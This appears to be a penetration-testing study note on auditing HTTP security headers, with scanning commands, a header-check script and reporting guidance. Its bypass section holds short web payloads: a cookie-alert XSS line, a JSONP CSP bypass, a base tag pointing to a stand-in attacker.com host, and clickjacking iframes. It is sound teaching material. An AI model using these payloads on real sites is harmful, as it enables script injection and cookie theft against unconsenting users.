---
tags:
  - Reconnaissance
  - Web_Application
  - Security_Headers
  - Foundational
---

## Security Headers Scanning
resources: [SecurityHeaders.com](https://securityheaders.com/), [Mozilla Observatory](https://observatory.mozilla.org/), [OWASP Secure Headers](https://owasp.org/www-project-secure-headers/)

> Analyze HTTP security headers to identify misconfigurations and potential vulnerabilities in web applications.

## What are Security Headers?

> [!info] Security headers are HTTP response headers that instruct browsers how to behave when handling content.
> - Prevent common web attacks (XSS, clickjacking, MIME sniffing)
> - Enforce secure communication (HTTPS, CSP)
> - Missing or misconfigured headers indicate security weaknesses
> - Can reveal information about the application stack

## Important Security Headers

### Content-Security-Policy (CSP)
> [!info] Prevents XSS attacks by controlling which resources can be loaded.

**Good CSP:**
```text
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com
```

**Weak CSP (Vulnerable):**
```text
Content-Security-Policy: default-src *; script-src 'unsafe-inline' 'unsafe-eval'
```

> [!warning] `unsafe-inline` and `unsafe-eval` allow XSS attacks.

### X-Frame-Options
> [!info] Prevents clickjacking attacks by controlling iframe embedding.

**Values:**
- `DENY` - Cannot be framed (most secure)
- `SAMEORIGIN` - Can only be framed by same origin
- `ALLOW-FROM https://example.com` - Can be framed by specific origin

**Missing X-Frame-Options:**
```text
# No header = vulnerable to clickjacking
```

### Strict-Transport-Security (HSTS)
> [!info] Forces browsers to use HTTPS only.

**Good HSTS:**
```text
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

**Weak HSTS:**
```text
Strict-Transport-Security: max-age=300
```

> [!warning] Short max-age values provide minimal protection.

### X-Content-Type-Options
> [!info] Prevents MIME-sniffing attacks.

**Correct Value:**
```text
X-Content-Type-Options: nosniff
```

> [!tip] Missing this header allows browsers to interpret files as different MIME types.

### X-XSS-Protection
> [!info] Enables browser's built-in XSS filter (legacy, replaced by CSP).

**Values:**
- `0` - Disables XSS filter (bad)
- `1` - Enables XSS filter
- `1; mode=block` - Blocks page if XSS detected (best)

### Referrer-Policy
> [!info] Controls how much referrer information is sent with requests.

**Secure Values:**
- `no-referrer` - Never send referrer
- `strict-origin-when-cross-origin` - Send origin only for cross-origin requests

**Insecure:**
- `unsafe-url` - Always send full URL (leaks sensitive data)

### Permissions-Policy (formerly Feature-Policy)
> [!info] Controls which browser features can be used.

**Example:**
```text
Permissions-Policy: geolocation=(), microphone=(), camera=()
```

## Manual Header Inspection

### Using curl
```bash
curl -I https://example.com
```

**Example Output:**
```text
HTTP/1.1 200 OK
Server: nginx/1.18.0
Content-Type: text/html
X-Frame-Options: DENY
Strict-Transport-Security: max-age=31536000
X-Content-Type-Options: nosniff
```

### Using curl with Specific Headers
```bash
curl -I -H "User-Agent: Mozilla/5.0" https://example.com
```

### Check Multiple URLs
```bash
for url in $(cat urls.txt); do
  echo "=== $url ==="
  curl -I "$url" | grep -E "(X-Frame|Content-Security|Strict-Transport|X-Content-Type|X-XSS)"
done
```

## Automated Scanning Tools

### SecurityHeaders.com (Online)
```text
https://securityheaders.com/?q=https://example.com
```

> [!tip] Provides letter grade (A+ to F) and detailed recommendations.

### Mozilla Observatory (Online)
```text
https://observatory.mozilla.org/analyze/example.com
```

> [!info] Comprehensive security analysis including headers, TLS, and more.

### shcheck - Security Headers Check (CLI)
```bash
# Install
pip3 install shcheck

# Scan single URL
shcheck https://example.com

# Scan with custom headers
shcheck https://example.com -H "Cookie: session=abc123"
```

### Nikto (Includes Header Checks)
```bash
nikto -h https://example.com
```

> [!info] Nikto checks for missing security headers as part of its scan.

### Nmap HTTP Security Headers Script
```bash
nmap -p 443 --script http-security-headers <TargetIP>
```

### Custom Python Script
```python
#!/usr/bin/env python3
import requests

url = "https://example.com"
response = requests.get(url)

security_headers = [
    "Content-Security-Policy",
    "X-Frame-Options",
    "Strict-Transport-Security",
    "X-Content-Type-Options",
    "X-XSS-Protection",
    "Referrer-Policy",
    "Permissions-Policy"
]

print(f"Security Headers for {url}:\n")
for header in security_headers:
    value = response.headers.get(header, "MISSING")
    print(f"{header}: {value}")
```

## Burp Suite Header Analysis

### Passive Scanning
> [!tip] Burp Suite automatically flags missing security headers.

**Steps:**
1. Browse target application through Burp proxy
2. Check **Target > Site map**
3. Look for **Issue Activity** tab
4. Filter for "Missing security headers"

### Manual Inspection
1. Intercept response in **Proxy > HTTP history**
2. Check **Response > Headers** tab
3. Look for security-related headers

## Common Vulnerabilities

### Missing CSP = XSS Vulnerable
```bash
# Test for XSS if CSP is missing
curl -I https://example.com | grep Content-Security-Policy
# If missing, test XSS payloads
```

### Missing X-Frame-Options = Clickjacking
```html
<!-- Create clickjacking PoC -->
<iframe src="https://vulnerable-site.com"></iframe>
```

### Missing HSTS = SSL Strip Attack
> [!warning] Attacker can downgrade HTTPS to HTTP.

### Weak CSP with unsafe-inline
```javascript
// If CSP allows unsafe-inline, XSS is possible
<script>alert(document.cookie)</script>
```

## Header Bypass Techniques

### CSP Bypass via JSONP
```javascript
// If CSP allows specific CDN
<script src="https://trusted-cdn.com/jsonp?callback=alert(1)"></script>
```

### CSP Bypass via Base Tag
```html
<!-- If CSP doesn't restrict base-uri -->
<base href="https://attacker.com/">
<script src="/malicious.js"></script>
```

### X-Frame-Options Bypass
```html
<!-- Try different protocols -->
<iframe src="http://example.com"></iframe>  <!-- If only HTTPS is protected -->
```

## Reconnaissance Value

### Information Disclosure

#### Server Header
```text
Server: Apache/2.4.41 (Ubuntu)
```

> [!tip] Reveals web server version - search for CVEs.

#### X-Powered-By Header
```text
X-Powered-By: PHP/7.4.3
```

> [!tip] Reveals backend technology and version.

#### X-AspNet-Version
```text
X-AspNet-Version: 4.0.30319
```

> [!tip] Reveals .NET framework version.

### Technology Stack Detection
```bash
# Check all headers for technology indicators
curl -I https://example.com | grep -E "(Server|X-Powered-By|X-AspNet|X-Generator)"
```

## Security Headers Checklist

### Minimum Required Headers
- [ ] `Content-Security-Policy` - Prevents XSS
- [ ] `X-Frame-Options: DENY` - Prevents clickjacking
- [ ] `Strict-Transport-Security` - Enforces HTTPS
- [ ] `X-Content-Type-Options: nosniff` - Prevents MIME sniffing
- [ ] `Referrer-Policy: no-referrer` - Prevents information leakage

### Recommended Headers
- [ ] `Permissions-Policy` - Restricts browser features
- [ ] `X-XSS-Protection: 1; mode=block` - Legacy XSS protection
- [ ] `Cache-Control: no-store` - Prevents caching sensitive data

### Headers to Remove (Information Disclosure)
- [ ] Remove `Server` header
- [ ] Remove `X-Powered-By` header
- [ ] Remove `X-AspNet-Version` header
- [ ] Remove `X-Generator` header

## Quick Scan Script

```bash
#!/bin/bash
# security-headers-scan.sh

URL=$1

echo "=== Security Headers Scan for $URL ==="
echo ""

HEADERS=(
    "Content-Security-Policy"
    "X-Frame-Options"
    "Strict-Transport-Security"
    "X-Content-Type-Options"
    "X-XSS-Protection"
    "Referrer-Policy"
    "Permissions-Policy"
)

for header in "${HEADERS[@]}"; do
    value=$(curl -s -I "$URL" | grep -i "^$header:" | cut -d' ' -f2-)
    if [ -z "$value" ]; then
        echo "[MISSING] $header"
    else
        echo "[FOUND] $header: $value"
    fi
done

echo ""
echo "=== Information Disclosure Headers ==="
curl -s -I "$URL" | grep -iE "^(Server|X-Powered-By|X-AspNet-Version|X-Generator):"
```

**Usage:**
```bash
chmod +x security-headers-scan.sh
./security-headers-scan.sh https://example.com
```

## OSCP Exam Tips

> [!important] Security headers are useful for reconnaissance but rarely exploitable alone.

**Time Estimate:** 2-3 minutes for header analysis

**Quick Wins:**
1. **Check for missing CSP** - Indicates XSS may be possible
2. **Check for missing X-Frame-Options** - Test for clickjacking
3. **Look for version disclosure** - Server, X-Powered-By headers
4. **Note weak configurations** - Document for report

**Common Mistakes:**
- Spending too much time on header analysis
- Assuming missing headers = automatic vulnerability
- Not testing actual exploitability (XSS, clickjacking)

**Pro Tips:**
- Use `curl -I` for quick header checks
- Focus on CSP and X-Frame-Options for actual vulnerabilities
- Document version information for later exploit searching
- Missing headers are report findings, not necessarily exploitable
- Combine with other recon (Nikto, Nmap, Burp)

## Example Analysis

```bash
# Quick header check
curl -I https://example.com

# Output analysis:
# Server: Apache/2.4.41 → Search for Apache 2.4.41 CVEs
# X-Powered-By: PHP/7.4.3 → Search for PHP 7.4.3 CVEs
# Missing CSP → Test for XSS vulnerabilities
# Missing X-Frame-Options → Test for clickjacking
# Missing HSTS → Note for report (SSL strip possible)
```

## Integration with Other Tools

### Combine with Nmap
```bash
nmap -p 80,443 --script http-security-headers,http-server-header <TargetIP>
```

### Combine with Nikto
```bash
nikto -h https://example.com -Tuning 6  # Focus on headers
```

### Combine with WhatWeb
```bash
whatweb -v https://example.com
```

> [!tip] WhatWeb identifies technologies and checks headers simultaneously.

## Reporting Findings

### Low Severity
- Missing `Referrer-Policy`
- Missing `Permissions-Policy`
- Short HSTS `max-age`

### Medium Severity
- Missing `X-Content-Type-Options`
- Missing `X-XSS-Protection`
- Weak CSP configuration

### High Severity
- Missing `Content-Security-Policy` (if XSS is possible)
- Missing `X-Frame-Options` (if clickjacking is possible)
- Missing `Strict-Transport-Security` on sensitive sites

### Information Disclosure
- `Server` header reveals version
- `X-Powered-By` reveals backend technology
- `X-AspNet-Version` reveals framework version
